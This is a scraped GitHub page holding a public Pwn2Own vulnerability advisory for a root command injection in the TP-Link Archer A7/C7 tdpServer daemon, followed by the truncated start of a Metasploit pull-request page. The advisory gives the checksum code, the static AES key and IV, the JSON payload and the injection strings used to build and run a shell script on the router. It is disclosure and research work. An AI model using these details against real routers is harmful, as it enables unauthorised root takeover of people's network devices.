=== Content from github.com_8889f542_20250119_111816.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpedrib%2FPoC%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo_2019%2Flao_bomb%2Flao_bomb.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpedrib%2FPoC%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo_2019%2Flao_bomb%2Flao_bomb.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=pedrib%2FPoC)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pedrib](/pedrib)
/
**[PoC](/pedrib/PoC)**
Public

* [Notifications](/login?return_to=%2Fpedrib%2FPoC) You must be signed in to change notification settings
* [Fork
  167](/login?return_to=%2Fpedrib%2FPoC)
* [Star
   830](/login?return_to=%2Fpedrib%2FPoC)

* [Code](/pedrib/PoC)
* [Issues
  0](/pedrib/PoC/issues)
* [Pull requests
  0](/pedrib/PoC/pulls)
* [Actions](/pedrib/PoC/actions)
* [Projects
  0](/pedrib/PoC/projects)
* [Wiki](/pedrib/PoC/wiki)
* [Security](/pedrib/PoC/security)
* [Insights](/pedrib/PoC/pulse)

Additional navigation options

* [Code](/pedrib/PoC)
* [Issues](/pedrib/PoC/issues)
* [Pull requests](/pedrib/PoC/pulls)
* [Actions](/pedrib/PoC/actions)
* [Projects](/pedrib/PoC/projects)
* [Wiki](/pedrib/PoC/wiki)
* [Security](/pedrib/PoC/security)
* [Insights](/pedrib/PoC/pulse)

## Files

 master
## Breadcrumbs

1. [PoC](/pedrib/PoC/tree/master)
2. /[advisories](/pedrib/PoC/tree/master/advisories)
3. /[Pwn2Own](/pedrib/PoC/tree/master/advisories/Pwn2Own)
4. /[Tokyo\_2019](/pedrib/PoC/tree/master/advisories/Pwn2Own/Tokyo_2019)
5. /[lao\_bomb](/pedrib/PoC/tree/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb)
/
# lao\_bomb.md

Copy path Blame  Blame
## Latest commit

## History

[History](/pedrib/PoC/commits/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md)490 lines (362 loc) · 22.5 KB master
## Breadcrumbs

1. [PoC](/pedrib/PoC/tree/master)
2. /[advisories](/pedrib/PoC/tree/master/advisories)
3. /[Pwn2Own](/pedrib/PoC/tree/master/advisories/Pwn2Own)
4. /[Tokyo\_2019](/pedrib/PoC/tree/master/advisories/Pwn2Own/Tokyo_2019)
5. /[lao\_bomb](/pedrib/PoC/tree/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb)
/
# lao\_bomb.md

Top
## File metadata and controls

* Preview
* Code
* Blame

490 lines (362 loc) · 22.5 KB[Raw](https://github.com/pedrib/PoC/raw/refs/heads/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md)
# lao\_bomb

---

# Summary

This advisory describes a command injection vulnerability that was found by **Pedro Ribeiro ([@pedrib1337](https://twitter.com/pedrib1337) | pedrib@gmail.com)** and **Radek Domanski ([@RabbitPro](https://twitter.com/RabbitPro) | radek.domanski@gmail.com)** in October 2019 and presented in the **Pwn2Own Mobile 2019 competition** in Tokyo on November 2019. Max Van Amerongen from F-Secure (@maxpl0it) found the same vulnerability independently.

The vulnerability exists in the tdpServer daemon (*/usr/bin/tdpServer*), running on the router TP-Link Archer A7/C7 (AC1750), hardware version 5, MIPS Architecture, firmware version 190726.

This vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. After exploitation, an attacker will be able to execute any command as root, including downloading and executing a binary from another host.

All function offsets and code snippets in this advisory were taken from */usr/bin/tdpServer*, firmware version 190726.

We have also made a [video version of this advisory](https://www.youtube.com/watch?v=zjafMP7EgEA), we highly recommend you check it out!

[![Exploiting (and Patching) a Zero Day RCE Vulnerability in a Western Digital NAS](https://camo.githubusercontent.com/a7039492587afddec0b9041dafa03b018d45476c3c0f9858cc91ca073c189fef/68747470733a2f2f696d672e796f75747562652e636f6d2f76692f7a6a61664d5037456745412f302e6a7067)](https://www.youtube.com/watch?v=zjafMP7EgEA)

## Note

This advisory was disclosed publicly on 25.03.2020.

A special thanks to the [Zero Day Initiative](https://www.zerodayinitiative.com/) (ZDI) for hosting us in the amazing Pwn2Own competition and allowing us to release this information to the public.

Copies of this advisory are available on GitHub at:

* [Pedro's GitHub](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md)
* [Radek's GitHub](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md)

The following CVE numbers have been assigned:

* [CVE-2020-10882](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10882)
* [CVE-2020-10883](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10883)
* [CVE-2020-10884](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10884)

ZDI's advisories can be found at:

* [ZDI-20-334](https://www.zerodayinitiative.com/advisories/ZDI-20-334/)
* [ZDI-20-335](https://www.zerodayinitiative.com/advisories/ZDI-20-335/)
* [ZDI-20-336](https://www.zerodayinitiative.com/advisories/ZDI-20-336/)

And their blog post:

* [Exploiting the TP-Link Archer A7 at Pwn2Own Tokyo](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo)

A Metasploit module was also made available to the public with this advisory, and can be found at:

* [tplink\_archer\_a7\_c7\_lan\_rce.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/tplink_archer_a7_c7_lan_rce.rb)

This module can be seen in action below (and in the cast file in the same directory as this advisory):
[![asciicast](https://camo.githubusercontent.com/19937e9baeb4836928ae889065be9840244aeffec92202ac435d9cffd508a93c/68747470733a2f2f61736369696e656d612e6f72672f612f3954764f65374e4d31335a7a334f56595758626e795743466e2e737667)](https://asciinema.org/a/9TvOe7NM13Zz3OVYWXbnyWCFn)

## Update (November 2020)

During our reseach for Pwn2Own Tokyo 2020, we found that TP-Link improperly patched the command injection, and we were able to exploit it again!
Unfortunately for us, they patched it one day before the competition, killing our (new?) bug. This injection bypass was assigned [CVE-2020-28347](https://nvd.nist.gov/vuln/detail/CVE-2020-28347).

As we had a bit more time to do deeper research, we were also able to improve the injection described here, and updated the [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/tplink_archer_a7_c7_lan_rce.rb) to work on older and newer versions with the same injection technique.
All details are available in [Pedro's GitHub](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2020/minesweeper.md) or [Radek's GitHub](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md).

~ Team Flashback

# Vulnerability Details

## Background on *tdpServer*

The *tdpServer* daemon listens on port 20002/udp on interface 0.0.0.0. The whole functionality of the daemon is not fully understood by the authors at this point, as this was unnecessary for exploitation. However, the daemon seems to be a bridge between the TP-Link mobile application and the router, allowing to establish some sort of control channel from the mobile application.

The daemon communicates with the mobile application through the use of UDP packets, with an encrypted payload. The packet format was reversed and it is shown below:

```
#define PACKET_SZ 0x400
#define PACKET_HDR_SZ 0x10
#define PAYLOAD_SZ (PACKET_SZ - PACKET_HDR_SZ)

typedef struct tpdp_packet {
  // packet version, fixed to 1
  uint8_t version;

  // packet type; tdpd == 0 or onemesh == 0xf0
  uint8_t type;

  // onemesh opcode, used by the onemesh_main switch table
  uint16_t opcode;

  // packet length
  uint16_t len;

  // some flag, has to be 1 to enter the vulnerable onemesh function
  uint8_t flags;

  // dunno what this is
  uint8_t unknown;

  // sn == serial number ? can be any value
  uint32_t sn;

  // packet checksum
  uint32_t checksum;

  // the payload can have up to 0x3F0 bytes
  uint8_t payload[PACKET_SZ-PACKET_HDR_SZ];
} packet;
```

The packet type determines what service in the daemon will be invoked. A type of 1 will cause the daemon to invoke the *tdpd* service, which will simply reply with a packet with a certain TETHER\_KEY in MD5. Because this is not relevant to the vulnerability, it wasn't investigated in detail.

The other possible type is 0xf0, which invokes the *onemesh* service. This service is where the vulnerability lies.
*OneMesh* appears to be a proprietary mesh technology that was introduced by TP-Link in recent firmware versions for a number of their routers (check <https://www.tp-link.com/us/onemesh/compatibility/> for details).

The other fields in the packet are relatively well explained in the comments above.

## Understanding the vulnerability

Upon start-up, the first relevant function invoked is *tdpd\_pkt\_handler\_loop()* (offset 0x40d164), which opens a UDP socket listening on port 20002/udp. Once a packet is received, this function passes the packet to *tpdp\_pkt\_parser()* (0x40cfe0) of which a snippet is shown below:

```
int tdpd_pkt_parser(int packet,int packet_len,int packet_reply,int *packet_reply_len,int param_5)

{
(...)
  if (packet != 0) {
    packet_len = return_0x10();
    if (packet_sz < packet_len) {
      print_debug("tdpdServer.c:709","recvbuf length = %d, less than hdr\'s 16",packet_sz);
      return 0xffffffff;
    }
    packet_len = tdpd_get_pkt_len(packet);
    if (packet_len < 1) {
      pcVar7 = "tdpdServer.c:716";
      pcVar8 = "tdp pkt is too big";
    }
    else {
      print_debug("tdpdServer.c:719","tdp pkt length is %d",packet_len);
      packet_len = tdpd_pkt_sanity_checks(packet,packet_len);
      if (packet_len < 0) {
        return 0xffffffff;
      }
(...)
```
> Snippet 1: *tdpd\_pkt\_parser()* #1

In this first snippet, we see that the parser first checks if the packet size (as received in the UDP socket) is at least 0x10, which is the size of the header.

Then it invokes tdpd\_get\_pkt\_len() (0x40d620), which returns the length of the packet as declared in the packet header (*len* field). This function returns -1 if the packet length exceeds 0x410.

The final check will be done by tdpd\_pkt\_sanity\_checks() (0x40c9d0), which will not be shown for brevity, but does two verifications: firstly, it checks if the packet version (*version* field, the first byte in the packet) is equal to 1. Secondly, it calculates a checksum of the packet using a custom checksum function - *tpdp\_pkt\_calc\_checksum()* (0x4037f0).

To better understand what is happening, the following function is *calc\_checksum()*, which is part of the **lao\_bomb** exploit code. This is shown in place of *tpdp\_pkt\_calc\_checksum()* as it is easier to understand.

```
void calc_checksum(packet *pkt, int len) {
  uint8_t *ptr;
  uint8_t val;
  uint32_t res;
  int32_t i = 0;

  // set magic var before calculating checksum
  pkt->checksum = 0x5a6b7c8d;

  res = 0xffffffff;
  ptr = (uint8_t*)pkt;

  while (i < len) {
    val = *(uint8_t*)ptr;
    res = *(uint32_t *)(reference_tbl + (((uint32_t)val ^ res) & 0xff) * 4) ^ (res >> 8);
    ptr += 1;
    i += 1;
  }

  res = ~res;
  pkt->checksum = res;
  return;
}
```
> Snippet 2: *calc\_checksum()* from the lao\_bomb exploit code

The checksum calculation is quite straightforward; it starts by setting a *magic* variable of 0x5a6b7c8d in the packet's checksum field, and then uses *reference\_tbl*, a table with 1024 bytes located at offset 0x0416e90, to calculate the checksum over the whole packet, including the header.

Once the checksum is verified and all is correct, *tdpd\_pkt\_sanity\_checks()* returns 0, and we then enter the next part of *tdpd\_pkt\_parser()*:

```
(...)
  if (*(char *)(packet + 1) == '\0') {
    (...)
  }

  if ((*(char *)(packet + 1) == 0xf0) && (onemesh_flag == '\x01')) {
    ret = onemesh_main(packet,packet_sz,packet_reply,packet_reply_len);
    return ret;
  }
(...)
```
> Snippet 3: *tdpd\_pkt\_parser()* #2

Here the second byte of the packet, *type* is checked to see if it's 0 (tdpd) or 0xf0 (onemesh). In the latter branch, it also checks if *onemesh\_flag* (a global variable) is set to 1, which it is by default. This is the branch we want to follow; then we enter *onemesh\_main()* (0x40cd78).

*onemesh\_main()* won't be shown here for brevity; but what it does is to invoke another function based on the packet's *opcode* field. In order to reach our vulnerable function, the *opcode* field has to be set to 6, and the *flags* field has to be set to 1. In this case, *onemesh\_slave\_key\_offer()* (0x414d14) will be invoked.

This is our vulnerable function, as it is very long, only the relevant parts will be shown.

```
int onemesh_slave_key_offer(int packet,undefined4 packet_sz,undefined *packet_reply,int *packet_reply_len)
{
(...)
  if (((packet == 0) || (packet_reply == NULL)) || (packet_reply_len == NULL)) {
    __s = "tdpOneMesh.c:2887";
    __dest = "Invalid parameters";
    goto return_-1_n_exit;
  }
  payload_dec = (void *)(packet + 0x10);
  memset(plaintext_out,0,0x400);
  ret = tpapp_aes_decrypt(payload_dec,(uint)*(ushort *)(packet + 4),"TPONEMESH_Kf!xn?gj6pMAt-wBNV_TDP",plaintext_out,0x400);
  if (ret != 0) {
    __s = "tdpOneMesh.c:2896";
    __dest = "Failed to decrypt.";
    goto return_-1_n_exit;
  }
  __n = strlen(plaintext_out);
  print_debug("tdpOneMesh.c:2899","plainLen is %d, plainText is %s",__n,plaintext_out);
(...)
```
> Snippet 4: *onemesh\_slave\_key\_offer()* #1

In this first snippet of *onemesh\_slave\_key\_offer()*, we see that the packet gets passed on to *tpapp\_aes\_decrypt()* (0x40b190). This function will also not be shown for brevity, but it's easy to understand what it does from the name and its arguments: it decrypts the packet contents with the AES algorithm and a static key *"TPONEMESH\_Kf!xn?gj6pMAt-wBNV\_TDP"*.

For now, let's assume that *tpapp\_aes\_decrypt* was able to decrypt the packet successfully and move on to the next relevant snippet in *onemesh\_slave\_key\_offer()*:

```
(...)
  print_debug("tdpOneMesh.c:2915","Enter..., rcvPkt->payload is %s",payload_dec);
  ret = tdp_onemesh_get_onemesh_info(onemesh_info);
  if (ret != 0) {
    print_debug("tdpOneMesh.c:2919","Failed tdp_onemesh_get_onemesh_info!");
    strncpy(error_msg,"Internal Error!",0xff);
  }
  parsed_obj = payload_parsing(payload_dec);
  if (parsed_obj == 0) {
    __s = "tdpOneMesh.c:2926";
    __dest = "Invalid rcvPkt";
    goto return_-1_n_exit;
  }
  str_obj = strcasestr_obj(parsed_obj,"method");
  if (((str_obj == 0) || (*(int *)(str_obj + 0xc) != 4)) || (str_obj = strcmp(*(char **)(str_obj + 0x10),"slave_key_offer"), str_obj != 0)) {
    __s = "tdpOneMesh.c:2934";
    __dest = "Invalid method!";
    goto return_-1_n_exit;
  }
  str_obj = strcasestr_obj(parsed_obj,"data");
  if ((str_obj == 0) || (*(int *)(str_obj + 0xc) != 6)) {
    __s = "tdpOneMesh.c:2941";
  }
  else {
    ret2 = strcasestr_obj(str_obj,"group_id");
    if (ret2 == 0) {
      __s = "tdpOneMesh.c:2948";
    }
    else {
      __s = "tdpOneMesh.c:2948";
      if (*(int *)(ret2 + 0xc) == 4) {
        strncpy(onemesh_info_cp,onemesh_info,0x3f);
(...)
```
> Snippet 5: *onemesh\_slave\_key\_offer()* #2

In this snippet, we see some other functions being called (basically the setup of the onemesh object) followed by the start of the parsing of the actual packet payload.

The expected payload is a JSON object, such as the one shown below:

```
{
  "method": "slave_key_offer",
  "data": {
    "group_id": "123",
    "ip": "1.3.3.7",
    "slave_mac": "00:11:22:33:44:55",
    "slave_private_account": "admin",
    "slave_private_password": "password",
    "want_to_join": false,
    "model": "owned",
    "product_type": "archer",
    "operation_mode": "whatever"
  }
}
```
> Example JSON payload for *onemesh\_slave\_key\_offer()*

In Snippet 5, we can see the code first fetching the *method* JSON key and its value, and then the start of the parsing of the *data* JSON object.
The next snippet shows that each key of the *data* object and its value is processed in order. If one of the required keys does not exist, the function simply exits:

```
(...)
  ret2 = strcasestr_obj(str_obj,"ip");
  if (ret2 == 0) {
    __s = "tdpOneMesh.c:2960";
  }
  else {
    __s = "tdpOneMesh.c:2960";
    if (*(int *)(ret2 + 0xc) == 4) {
      strncpy(slaveIp,*(char **)(ret2 + 0x10),0xf);
      print_debug("tdpOneMesh.c:2964","slaveIp is %s",slaveIp);
      ret2 = strcasestr_obj(str_obj,"slave_mac");
      if ((ret2 == 0) || (*(int *)(ret2 + 0xc) != 4)) {
        __s = "tdpOneMesh.c:2969";
      }
      else {
        strncpy(slaveMac_copy,*(char **)(ret2 + 0x10),0x11);
        strncpy(slaveMac,*(char **)(ret2 + 0x10),0x11);
        ret2 = strcasestr_obj(str_obj,"slave_private_account");
        if (ret2 == 0) {
          __s = "tdpOneMesh.c:2978";
        }
        else {
          __s = "tdpOneMesh.c:2978";
          if (*(int *)(ret2 + 0xc) == 4) {
            strncpy(encAccount,*(char **)(ret2 + 0x10),0x207);
            ret2 = strcasestr_obj(str_obj,"slave_private_password");
            if (ret2 == 0) {
              __s = "tdpOneMesh.c:2986";
            }
            else {
              __s = "tdpOneMesh.c:2986";
              if (*(int *)(ret2 + 0xc) == 4) {
                strncpy(encPassword,*(char **)(ret2 + 0x10),0x207);
                ret2 = strcasestr_obj(str_obj,"want_to_join");
                if (ret2 == 0) {
                  __s = "tdpOneMesh.c:2995";
                }
                else {
                  if (*(int *)(ret2 + 0xc) == 1) {
                    ret2 = 1;
                    acStack3190[0] = '1';
                  }
                  else {
                    if (*(int *)(ret2 + 0xc) != 0) {
                      __s = "tdpOneMesh.c:3013";
                      goto ret_invalid_data;
                    }
                    ret2 = 0;
                    acStack3190[0] = '0';
                  }
                  ret3 = strcasestr_obj(str_obj,"model");
                  if ((ret3 == 0) || (*(int *)(ret3 + 0xc) != 4)) {
                    __s = "tdpOneMesh.c:3021";
                  }
                  else {
                    strncpy(model,*(char **)(ret3 + 0x10),0x20);
                    ret3 = strcasestr_obj(str_obj,"product_type");
                    if (ret3 == 0) {
                      __s = "tdpOneMesh.c:3029";
                    }
                    else {
                      __s = "tdpOneMesh.c:3029";
                      if (*(int *)(ret3 + 0xc) == 4) {
                        strncpy(prod_type,*(char **)(ret3 + 0x10),0x20);
                        ret3 = strcasestr_obj(str_obj,"operation_mode");
                        if (ret3 == 0) {
                          __s = "tdpOneMesh.c:3037";
                        }
                        else {
                          __s = "tdpOneMesh.c:3037";
                          if (*(int *)(ret3 + 0xc) == 4) {
                            strncpy(op_mode,*(char **)(ret3 + 0x10),0x10);
                            if (ret2 == 0) {
                              str_obj = create_csjon_obj();
                              if (str_obj == 0) {
                                __s = "tdpOneMesh.c:3132";
                                __dest = "Failed to creat cJSON Obj";
                                ret = -1;
                                print_debug(__s,__dest);
                                __s = NULL;
(...)
```
> Snippet 6: *onemesh\_slave\_key\_offer()* #3

As it can be seen above, each JSON key is parsed and then copied into a stack variable (*slaveMac*, *slaveIp*, etc).

At the end of the parsing of the JSON object, the function starts preparing the response by invoking *create\_csjon\_obj()* (0x405fe8).

From here onwards, the function does a lot of different operations on the data that was received and while preparing the response. These will not be explained here for two reasons:

1. They are inconsequential to our vulnerability and exploit.
2. We did not take the time to understand them, because of point 1.

The part that matters is shown below:

```
(...)
  print_debug("tdpOneMesh.c:3363","Sync wifi for specified mac %s start.....",slaveMac);
  memset(systemCmd,0,0x200);
  snprintf(systemCmd,0x1ff,
    "lua -e \'require(\"luci.controller.admin.onemesh\"). \
    sync_wifi_specified({mac=\"%s\"})\'",slaveMac);
  print_debug("tdpOneMesh.c:3368","systemCmd: %s",systemCmd);
  system(systemCmd);
  print_debug("tdpOneMesh.c:3370","Sync wifi for specified mac %s end.....",slaveMac);
(...)
```
> Snippet 7: *onemesh\_slave\_key\_offer()* #4

And here is our vulnerability in full glory. If you recall **Snippet 6** above, you'll see that the JSON key *slave\_mac* is copied into the *slaveMac* stack variable.

In **Snippet 7**, *slaveMac* will then be copied by *sprintf* into the *systemCmd* variable that will then be passed to *system()*.

Looking closely, there is a very clear command injection here. However to exploit it, we will need to escape the command, which will be demonstrated in the next section.

# Exploitation

## Reaching the vulnerable function

The first thing to understand is how we can reach this clean command injection. After trial and error, we found out that sending the JSON structure shown above (\*Example JSON payload for \*onemesh\_slave\_key\_offer()\*\*) always hits this vulnerable code path.

In particular, *method* has to be *slave\_key\_offer*, and *want\_to\_join* has to be *false*. The other values can be somewhat random, although some special characters in fields other than *slave\_mac* might cause the vulnerable function to exit early and not process our injection.

With regards to the packet header, as previously described, we have to set *type* to 0xf0, *opcode* to 6 and *flags* to 1, as well as get the *checksum* field correct.

## Encrypting the packet

As explained in the previous section, the packet gets encrypted with AES in CBC mode with a fixed key of *TPONEMESH\_Kf!xn?gj6pMAt-wBNV\_TDP* and a fixed IV of *1234567890abcdef1234567890abcdef*. Despite having a 32 byte / 256 bit key and IV, the actual algorithm used is AES-CBC with a 128 bit key, so half of the key and IV are not used.

## Achieving code execution

So now we know how to hit the vulnerable code path, we just need to send the command and that's it right? Well, actually no. There are two problems.

1. The *strncpy()* that copies the *slave\_mac\_info* key into the *slaveMac* variable only copies 0x11 / 17 bytes, and that's including the terminating null byte.
2. We need to perform some escaping as the lua code is single and double quoted.

With these two constraints in mind, the actual available space is quite limited.

In order to escape the lua code and execute our payload, we have to add the following characters:

```
';<PAYLOAD>'

```

So that's 3 characters that we just lost, plus 1 for the terminating null byte, which leaves us with only 13 bytes of payload.
With 13 bytes (characters), it's pretty much impossible to execute anything meaningful.

Our solution was to trigger the bug many times, building up a desired **command file** on the target, one character at a time. Then we trigger the bug one final time to execute the command file as a shell script.

For example that to append the character 'a' to a file 'z', we can do the following:

```
printf 'a'>>z

```

And that's 13 bytes used!

Luckily, the above is just enough to print all characters we need to achieve code execution. And even more luckily, we do not need to change the directory to */tmp*, as it is many times necessary in embedded devices because the filesystem root is usually not writeable. In this router, the filesystem is mounted read-write, which is a major security mistake by TP-Link.

Had it been mounted read-only, as it is normal in most embedded devices that use the SquashFS filesystem, this particular attack would have been impossible, as adding *cd tmp* before each byte injection would consume too many of the available 13 characters.

It should be noted that despite the escaping we do, the last few bytes of the lua script code that was supposed to be executed end up in the file name. So a file named 'z' in reality will be named 'z"})'. This doesn't affect us, since it doesn't shorten the 13 bytes available for the payload.

And with this, we have all we need to execute arbitrary commands. We send the command byte by byte, adding them to a command file 'z', and then we send the payload:

```
sh z

```

... and our command file gets executed as root. From here on, we can download and execute a binary, and we have full control of the router.

## Errata

The original version of this advisory was based on the C exploit we originally wrote for the Pwn2Own competition, and due to problems at the time we could only use 12 bytes instead of 13 to send our command.

This caused a major headache when printing special characters such as ';' or digits, which would be interpreted by the shell instead of being printed. To work around this, we used a trick that involved printing the special characters to another separate file, and then using *cat* to add the contents to that file to the command file.

After porting the exploit to Metasploit, we realised that actually we could use 13 bytes, and our workaround was unnecessary.

The original advisory can be found in its full glory at [Exploiting the TP-Link Archer A7 at Pwn2Own Tokyo](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_fc24b46e_20250119_111819.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F14365)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F14365)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  410](/rapid7/metasploit-framework/issues)
* [Pull requests
  37](/rapid7/metasploit-framework/pulls)
